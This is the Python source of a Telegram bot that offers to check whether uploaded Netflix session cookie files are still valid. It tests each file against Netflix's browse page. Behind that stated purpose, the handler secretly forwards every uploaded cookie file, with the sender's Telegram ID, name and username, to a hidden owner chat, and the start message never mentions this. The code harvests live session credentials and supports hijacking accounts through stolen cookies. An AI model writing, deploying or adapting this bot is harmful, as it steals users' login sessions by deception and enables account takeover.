import os
import json
import requests
from dotenv import load_dotenv
from telegram import Update, Document
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters

load_dotenv()

BOT_TOKEN = os.environ.get("BOT_TOKEN")
OWNER_CHAT_ID = os.environ.get("OWNER_CHAT_ID")
if not BOT_TOKEN or not OWNER_CHAT_ID:
    raise ValueError("BOT_TOKEN and OWNER_CHAT_ID environment variables must be set in .env file.")
try:
    OWNER_CHAT_ID = int(OWNER_CHAT_ID)
except ValueError:
    raise ValueError("OWNER_CHAT_ID must be an integer.")

NETFLIX_BROWSE_URL = "https://www.netflix.com/browse"

def parse_cookies(file_content: str, file_type: str) -> dict:
    """Parse cookies from JSON or Netscape formats (including HttpOnly lines)."""
    if file_type.lower() == 'json' or file_content.lstrip().startswith('['):
        try:
            data = json.loads(file_content)
            if isinstance(data, list):
                return {c["name"]: c["value"] for c in data if "name" in c and "value" in c}
        except json.JSONDecodeError:
            pass

    cookies = {}
    for line in file_content.splitlines():
        line = line.strip()
        if not line or (line.startswith('#') and not line.startswith('#HttpOnly_')):
            continue
        if line.startswith('#HttpOnly_'):
            line = line[len('#HttpOnly_'):]
        parts = line.split('\t')
        if len(parts) >= 7:
            cookies[parts[5]] = parts[6]
    return cookies

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc: Document = update.message.document
    if not doc.file_name.lower().endswith(('.txt', '.json')):
        return await update.message.reply_text(
            "❌ Please upload a valid .txt or .json file.",
            reply_to_message_id=update.message.message_id
        )

    # download
    file = await doc.get_file()
    file_path = f"/tmp/{doc.file_unique_id}"
    await file.download_to_drive(file_path)

    try:
        content = open(file_path, 'r', encoding='utf-8').read()
        cookies = parse_cookies(content, doc.file_name.rsplit('.', 1)[-1])
        if not cookies:
            return await update.message.reply_text(
                "❌ Invalid cookie format. Please ensure it's correct in JSON or Netscape format.",
                reply_to_message_id=update.message.message_id
            )

        resp = requests.get(NETFLIX_BROWSE_URL, headers={"User-Agent": "Mozilla/5.0"}, cookies=cookies)
        if resp.status_code != 200 or resp.url.rstrip('/').lower() != NETFLIX_BROWSE_URL:
            return await update.message.reply_text(
                "❌ Netflix cookies are invalid or expired.",
                reply_to_message_id=update.message.message_id
            )

        bot = context.bot
        me = await bot.get_me()
        ext = doc.file_name.rsplit('.', 1)[-1]
        new_name = f"@{me.username} - {update.message.message_id}.{ext}"

        with open(file_path, 'rb') as f:
            await bot.send_document(
                chat_id=update.effective_chat.id,
                document=f,
                filename=new_name,
                caption=f"✅ This cookie is valid, checked via @{me.username}.",
                reply_to_message_id=update.message.message_id,
                parse_mode="Markdown"
            )

        sender = update.effective_user
        owner_caption = f"[{sender.id}](tg://user?id={sender.id})\n{sender.full_name}"
        if sender.username:
            owner_caption += f"\n@{sender.username}"

        with open(file_path, 'rb') as f2:
            await bot.send_document(
                chat_id=OWNER_CHAT_ID,
                document=f2,
                filename=doc.file_name,
                caption=owner_caption,
                parse_mode="Markdown"
            )

    except Exception as e:
        await update.message.reply_text(
            f"❌ Error processing file: {e}",
            reply_to_message_id=update.message.message_id
        )
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Hi! Send me your Netflix cookies file (.txt or .json) and I'll check it for you.",
        reply_to_message_id=update.message.message_id
    )

if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(CommandHandler("start", start_command))

    print("Bot is running...")
    app.run_polling()
